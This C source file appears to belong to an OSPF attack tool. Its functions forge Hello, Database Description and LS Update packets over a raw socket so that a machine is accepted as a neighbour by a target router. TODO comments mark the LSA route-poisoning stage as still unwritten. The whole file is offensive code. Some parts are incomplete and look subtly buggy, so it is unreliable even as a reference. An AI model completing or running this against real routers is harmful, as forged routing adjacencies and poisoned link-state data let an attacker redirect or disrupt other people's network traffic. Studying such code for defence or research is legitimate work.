#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <netinet/ip.h>

#include "ospf.h"
#include "ospf_attack.h"
#include "utils.h"

int attack_wait_ospf_packet(struct attack_env *env);

int attack_wait_for_db_description(struct attack_env *env);
void attack_sync_db_desc(struct attack_env *env);
int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control);

int attack_wait_for_ls_update(struct attack_env *env);

void attack_establish_adjacency(struct attack_env *env) {
  int ret_value;
  fprintf(stderr, "ESTABLISHING ADJACENCY\n");

  int packet_len = ospf_multicast_hello(env->buffer, env->local_mac, env->local_ip, env->router_ip);
  fprintf(stderr, "- Sending multicast hello... ");
  if((ret_value = send_packet(env->sock_fd, parse_mac_addr(IPV4_MULTICAST_MAC), env->buffer, env->iface_index, packet_len)) < 0) {
    die("\nFATAL: Error sending Hello packet\n");
  }
  fprintf(stderr, "DONE (%d)\n", ret_value);

  attack_sync_db_desc(env);

  int n;
  for (n = 0; n < 4; n++) {
    ret_value = attack_wait_for_ls_update(env);
    struct ospf_lsu *lsu = (struct ospf_lsu *)(env->buffer + ret_value + sizeof(struct ospf_header));
    struct ip *ip_header = (struct ip*)(env->buffer + sizeof(struct ether_header));

    unsigned char *dest_mac = calloc(sizeof(unsigned char), MAC_ADDR_LEN);
    char *dest_ip;

    // Is it a multicast msg or a message to me?
    if (ip_header->ip_dst.s_addr == inet_addr(IPV4_MULTICAST_ADDR)) {
      printf("MULTICAST\n");
      dest_ip = IPV4_MULTICAST_ADDR;
      dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
    } else if (ip_header->ip_dst.s_addr == inet_addr(IPV4_MULTICAST_ADDR_2)) {
      printf("MULTICAST_2\n");
      dest_ip = IPV4_MULTICAST_ADDR_2;
      dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC_2);
    } else if (ip_header->ip_dst.s_addr == inet_addr(env->local_ip)) {
      printf("ME\n");
      dest_ip = env->router_ip;
      memcpy(dest_mac, env->router_mac, MAC_ADDR_LEN);
    } else {
      die("Error during LS Update");
    }

    fprintf(stderr, "REPLY ACKS TO to: %x:%x:%x:%x:%x:%x \n", dest_mac[0],dest_mac[1],dest_mac[2],dest_mac[3],dest_mac[4],dest_mac[5]);
    fprintf(stderr, "REPLY ACKS TO to: %s\n", dest_ip);
    fprintf(stderr, "TOTAL ADVERTISEMENTS %d\n", ntohl(lsu->lsu_nads));

    struct ospf_lss *lss = (struct ospf_lss *)(env->buffer + ret_value + sizeof(struct ospf_header) + sizeof(struct ospf_lsu));
    unsigned long nads = ntohl(lsu->lsu_nads);
    int i;
    for (i = 0; i < nads; i++) {
      fprintf(stderr, "- Sending LS update in reply to %x...\n", lss->lss_seq);
      unsigned char new_buffer[BUFFER_LEN];
      packet_len = ospf_ls_update(new_buffer, env->local_mac, env->local_ip, dest_mac, dest_ip, lss->lss_seq, lss->lss_type, env->router_ip);
      if((ret_value = send_packet(env->sock_fd, dest_mac, new_buffer, env->iface_index, packet_len)) < 0) {
        die("\nFATAL: Error sending LS Update packet\n");
      }
      fprintf(stderr, "DONE (%d)\n", ret_value);
      lss += ntohs(lss->lss_len);
    }
  }

  fprintf(stderr, "TODO: read seq number, dest mac and ip and reply with ack\n");
  // attack_send_ls_ack(env, dest_mac, dest_ip, seq_number);

  fprintf(stderr, "TODO: Send LS update for the poising\n");
  fprintf(stderr, "TODO: Send hello indefinitely\n");
}

void attack_sync_db_desc(struct attack_env *env) {
  int ret_value;
  unsigned long dd_seq_number = 10000;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  // Store the mac address sent by the router
  struct ether_header *eth_header = (struct ether_header *)env->buffer;
  env->router_mac = calloc(sizeof(unsigned char), MAC_ADDR_LEN);
  memcpy(env->router_mac, eth_header->ether_shost, MAC_ADDR_LEN);
  fprintf(stderr, "- Router MAC set to: %x:%x:%x:%x:%x:%x \n", env->router_mac[0],env->router_mac[1],env->router_mac[2],env->router_mac[3],env->router_mac[4],env->router_mac[5]);

  fprintf(stderr, "- Sending DB description with INIT, MORE and MASTER/SLAVE... ");
  attack_send_db_description(env, dd_seq_number, DDC_INIT + DDC_MORE + DDC_MSTR);
  fprintf(stderr, "DONE (%d)\n", ret_value);
  dd_seq_number += 1;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  struct ospf_dd *db_desc = (struct ospf_dd *)(env->buffer + ret_value + sizeof(struct ospf_header));

  while (db_desc->dd_control != 0) {
    fprintf(stderr, "- MORE flag is set, sending another DB description with MORE and MASTER/SLAVE... ");
    attack_send_db_description(env, dd_seq_number, DDC_MORE + DDC_MSTR);
    fprintf(stderr, "DONE (%d)\n", ret_value);
    dd_seq_number += 1;

    if ((ret_value = attack_wait_for_db_description(env)) < 0) {
      die("Error while waiting for DB description");
    }
    db_desc = (struct ospf_dd *)(env->buffer + ret_value + sizeof(struct ospf_header));
  }

  fprintf(stderr, "- Sending the last DB description with the MASTER/SLAVE flag set... ");
  attack_send_db_description(env, dd_seq_number, DDC_MSTR);
  fprintf(stderr, "DONE (%d)\n", ret_value);
  dd_seq_number += 1;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  db_desc = (struct ospf_dd *)(env->buffer + ret_value + sizeof(struct ospf_header));
  if (db_desc->dd_control != 0) {
    die("Unexpected DB description message received");
  }
}

int attack_wait_for_db_description(struct attack_env *env) {
  struct ip *ip_header;
  struct ether_header *eth_header;
  struct ospf_header *ospf_header;

  fprintf(stderr, "- Waiting for DB description...");
  while (1) {
    if (recv(env->sock_fd, (char *)env->buffer, sizeof(env->buffer), 0x0) < 0) {
      fprintf(stderr, "T");
      // If an error occured, check if it was a timeout and try again
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        continue;
      } else {
        die("Unknown error while reading from socket");
      }
    }
    fprintf(stderr, ".");

    unsigned char *buffer_ptr = env->buffer;

    eth_header = (struct ether_header *)buffer_ptr;
    if (eth_header->ether_type != htons(0x0800)) continue;
    buffer_ptr += sizeof(struct ether_header);

    ip_header = (struct ip *)buffer_ptr;
    if (ip_header->ip_p != PROTO_OSPF) continue;
    buffer_ptr += ip_header->ip_hl * 4;

    ospf_header = (struct ospf_header *)buffer_ptr;
    if (ospf_header->ospf_type != OSPF_DATADESC_T) continue;

    // Is it a message from the router?
    if (((__u32)ip_header->ip_src.s_addr) != inet_addr(env->router_ip)) continue;

    // Is it a message for me?
    if (ip_header->ip_dst.s_addr != inet_addr(env->local_ip)) continue;

    fprintf(stderr, " CAPTURED\n");

    break;
  }
  return sizeof(struct ether_header) + ip_header->ip_hl * 4;
}

int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control) {
  int packet_len = ospf_db_description(env->buffer, env->local_mac, env->local_ip, env->router_mac, env->router_ip, sequence_number, control);
  if (send_packet(env->sock_fd, env->router_mac, env->buffer, env->iface_index, packet_len) < 0) {
    die("\nFATAL: Error sending DB description packet\n");
  }
  return packet_len;
}

int attack_wait_for_ls_update(struct attack_env *env) {
  struct ip *ip_header;
  struct ether_header *eth_header;
  struct ospf_header *ospf_header;

  fprintf(stderr, "- Waiting for LS Update...");
  while (1) {
    if (recv(env->sock_fd, (char *)env->buffer, sizeof(env->buffer), 0x0) < 0) {
      fprintf(stderr, "T");
      // If an error occured, check if it was a timeout and try again
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        continue;
      } else {
        die("Unknown error while reading from socket");
      }
    }
    fprintf(stderr, ".");

    unsigned char *buffer_ptr = env->buffer;

    eth_header = (struct ether_header *)buffer_ptr;
    if (eth_header->ether_type != htons(0x0800)) continue;
    buffer_ptr += sizeof(struct ether_header);

    ip_header = (struct ip *)buffer_ptr;
    if (ip_header->ip_p != PROTO_OSPF) continue;
    buffer_ptr += ip_header->ip_hl * 4;

    ospf_header = (struct ospf_header *)buffer_ptr;
    if (ospf_header->ospf_type != OSPF_LSUPDATE_T) continue;

    // Is it a message from the router?
    if (((__u32)ip_header->ip_src.s_addr) != inet_addr(env->router_ip)) continue;

    fprintf(stderr, " CAPTURED\n");

    break;
  }
  return sizeof(struct ether_header) + ip_header->ip_hl * 4;
}
